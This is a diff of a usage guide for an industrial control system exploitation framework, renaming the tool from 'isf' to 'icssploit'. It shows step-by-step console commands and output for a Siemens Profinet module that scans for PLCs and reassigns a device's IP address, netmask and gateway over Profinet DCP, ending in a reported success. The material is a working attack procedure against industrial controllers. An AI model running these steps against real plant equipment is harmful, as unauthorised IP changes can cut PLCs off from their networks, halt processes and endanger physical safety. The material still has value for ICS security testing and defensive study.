@@ -1,7 +1,7 @@
 # Profinet set ip
 
 # Use Profinet set ip module
-    root@kali:~/Desktop/temp/isf# python isf.py
+    root@kali:~/Desktop/temp/icssploit# python icssploit.py
     
       _____ _____  _____ _____ _____  _      ____ _____ _______
      |_   _/ ____|/ ____/ ____|  __ \| |    / __ \_   _|__   __|
@@ -24,16 +24,16 @@
         PLC: 5          ICS Switch: 0
         Software: 0
     
-    isf >
-    isf > search profinet
+    icssploit >
+    icssploit > search profinet
     exploits/plcs/siemens/profinet_set_ip
     scanners/profinet_dcp_scan
-    isf > exploits/plcs/siemens/profinet_set_ip
-    isf (profinet device ip setup) >
+    icssploit > exploits/plcs/siemens/profinet_set_ip
+    icssploit (profinet device ip setup) >
 
     
 # Set options
-    isf (profinet device ip setup) > show options
+    icssploit (profinet device ip setup) > show options
     Target options:
     
        Name       Current settings      Description
@@ -54,30 +54,30 @@
     
     # Because profient dcp is a ethernet protocol, we need setup which interface to send and recive profinet dpc packet.
     # Use set nic eth0 to define which interface we want to send and recive profinet dpc packet.
-    isf (profinet device ip setup) > set nic eth0
+    icssploit (profinet device ip setup) > set nic eth0
     [+] {'nic': 'eth0'}
     
     # Setup target mac address
-    isf (profinet device ip setup) > set target 00:1c:06:1d:ff:ff
+    icssploit (profinet device ip setup) > set target 00:1c:06:1d:ff:ff
     [+] {'target': '00:1c:06:1d:ff:ff'}
     
     # If you didn't know target mac address this time, you can use scan command to discover profinet devices.
-    isf (profinet device ip setup) > scan
+    icssploit (profinet device ip setup) > scan
     Device Name    Device Type    MAC Address        IP Address      Netmask        GateWay
     -------------  -------------  -----------------  --------------  -------------  ---------
     plcxb1d0ed     S7-1200        00:1c:06:1d:ff:ff  192.168.1.100  255.255.255.0  0.0.0.0
     
     # Setup ip address, netmask and gateway.
-    isf (profinet device ip setup) > set target_ip 192.168.1.110
+    icssploit (profinet device ip setup) > set target_ip 192.168.1.110
     [+] {'target_ip': '192.168.1.110'}
-    isf (profinet device ip setup) > set target_netmask 255.255.255.0
+    icssploit (profinet device ip setup) > set target_netmask 255.255.255.0
     [+] {'target_netmask': '255.255.255.0'}
     # Set gateway to 0.0.0.0 mean target didn't have a gateway.
-    isf (profinet device ip setup) > set target_gateway 0.0.0.0
+    icssploit (profinet device ip setup) > set target_gateway 0.0.0.0
     [+] {'target_gateway': '0.0.0.0'}
 
 # Run module
-    isf (profinet device ip setup) > run
+    icssploit (profinet device ip setup) > run
     # run command will send a profinet dcp packet to check target current ip setting. 
     Device Name    Device Type    MAC Address        IP Address      Netmask        GateWay
     -------------  -------------  -----------------  --------------  -------------  ---------
@@ -98,4 +98,4 @@
     
     
     [+] Setup target ip succeed
-    isf (profinet device ip setup) >
+    icssploit (profinet device ip setup) >
